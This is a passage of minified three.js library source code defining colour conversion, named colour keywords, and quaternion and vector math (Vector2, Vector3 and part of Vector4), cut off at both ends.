this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&&\n(c=THREE.ColorKeywords[a],void 0!==c?this.setHex(c):console.warn(\"THREE.Color: Unknown color \"+a));return this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},copyGammaToLinear:function(a,b){void 0===b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return this},copyLinearToGamma:function(a,b){void 0===b&&(b=2);var c=0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,\nc);return this},convertGammaToLinear:function(){var a=this.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return(\"000000\"+this.getHex().toString(16)).slice(-6)},getHSL:function(a){a=a||{h:0,s:0,l:0};var b=this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=\n(f+e)/2;if(f===e)f=g=0;else{var k=e-f,f=.5>=h?k/(e+f):k/(2-e-f);switch(e){case b:g=(c-d)/k+(c<d?6:0);break;case c:g=(d-b)/k+2;break;case d:g=(b-c)/k+4}g/=6}a.h=g;a.s=f;a.l=h;return a},getStyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsetHSL:function(a,b,c){var d=this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(a,b){this.r=a.r+b.r;this.g=a.g+b.g;this.b=\na.b+b.b;return this},addScalar:function(a){this.r+=a;this.g+=a;this.b+=a;return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return a.r===this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void 0===b&&(b=0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return this},toArray:function(a,\nb){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.r;a[b+1]=this.g;a[b+2]=this.b;return a}};\nTHREE.ColorKeywords={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,\ndarkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,\ngrey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,\nlime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,\npalegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,\ntomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};THREE.Quaternion=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void 0!==d?d:1};\nTHREE.Quaternion.prototype={constructor:THREE.Quaternion,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get w(){return this._w},set w(a){this._w=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},\ncopy:function(a){this._x=a.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return this},setFromEuler:function(a,b){if(!1===a instanceof THREE.Euler)throw Error(\"THREE.Quaternion: .setFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var c=Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),k=a.order;\"XYZ\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===\nk?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"ZXY\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===k&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return this},setFromAxisAngle:function(a,\nb){var c=b/2,d=Math.sin(c);this._x=a.x*d;this._y=a.y*d;this._z=a.z*d;this._w=Math.cos(c);this.onChangeCallback();return this},setFromRotationMatrix:function(a){var b=a.elements,c=b[0];a=b[4];var d=b[8],e=b[1],f=b[5],g=b[9],h=b[2],k=b[6],b=b[10],l=c+f+b;0<l?(c=.5/Math.sqrt(l+1),this._w=.25/c,this._x=(k-g)*c,this._y=(d-h)*c,this._z=(e-a)*c):c>f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(k-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=\n.25*c,this._z=(g+k)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+k)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=\n-1;this._y*=-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},\nmultiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,k=b._z,l=b._w;this._x=c*l+f*g+d*k-e*h;this._y=d*l+f*h+e*g-c*k;this._z=e*l+f*k+c*h-d*g;this._w=f*l-c*g-d*h-e*k;this.onChangeCallback();\nreturn this},slerp:function(a,b){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=f,this._x=c,this._y=d,this._z=e,this;var h=Math.sqrt(1-g*g);if(.001>Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var k=Math.atan2(h,g),g=Math.sin((1-b)*k)/h,h=Math.sin(b*\nk)/h;this._w=f*g+this._w*h;this._x=c*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=\na;return this},onChangeCallback:function(){}};\nObject.assign(THREE.Quaternion,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],k=c[d+1],l=c[d+2];c=c[d+3];d=e[f+0];var n=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||k!==n||l!==p){f=1-g;var m=h*d+k*n+l*p+c*e,q=0<=m?1:-1,r=1-m*m;r>Number.EPSILON&&(r=Math.sqrt(r),m=Math.atan2(r,m*q),f=Math.sin(f*m)/r,g=Math.sin(g*m)/r);q*=g;h=h*f+d*q;k=k*f+n*q;l=l*f+p*q;c=c*f+e*q;f===1-g&&(g=1/Math.sqrt(h*h+k*k+l*l+c*c),h*=g,k*=g,l*=g,c*=g)}a[b]=h;a[b+1]=k;a[b+2]=l;\na[b+3]=c}});THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};\nTHREE.Vector2.prototype={constructor:THREE.Vector2,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},\naddScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,\nthis.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===\na&&(a=new THREE.Vector2,b=new THREE.Vector2);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},angle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},\ndistanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},\ntoArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-a.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};THREE.Vector3=function(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0};\nTHREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;\ncase 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(a,\nb){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;return this},\nmultiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===b instanceof THREE.Euler&&\nconsole.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},\napplyMatrix4:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this},applyProjection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;var e=1/(a[3]*b+a[7]*c+a[11]*d+a[15]);this.x=(a[0]*b+a[4]*c+a[8]*d+a[12])*e;this.y=(a[1]*b+a[5]*c+a[9]*d+a[13])*e;this.z=(a[2]*b+a[6]*c+a[10]*d+a[14])*e;return this},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=\na.w;var h=a*b+f*d-g*c,k=a*c+g*b-e*d,l=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+k*-g-l*-f;this.y=k*a+b*-f+l*-e-h*-g;this.z=l*a+b*-g+h*-f-k*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.projectionMatrix,a.getInverse(b.matrixWorld));return this.applyProjection(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyProjection(a)}}(),\ntransformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=\nMath.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=\nMath.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=\n-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=\n(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-d*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;\nthis.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=this.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(THREE.Math.clamp(a,\n-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,\n1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");var c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===\nb&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];return this}};THREE.Vector4=function(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1};\nTHREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+\na);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);\nthis.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=\na.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=this.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=\na[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],k=a[9];c=a[2];b=a[6];var l=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>\nMath.abs(k-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(k+b)&&.1>Math.abs(e+h+l-3))return this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;l=(l+1)/2;d=(d+g)/4;f=(f+c)/4;k=(k+b)/4;e>h&&e>l?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>l?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),b=d/c,d=k/c):.01>l?(c=b=.707106781,d=0):(d=Math.sqrt(l),b=f/d,c=k/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-k)*(b-k)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-k)/\na;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+l-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);this.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));\nthis.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector4,b=new THREE.Vector4);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=\nMath.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return 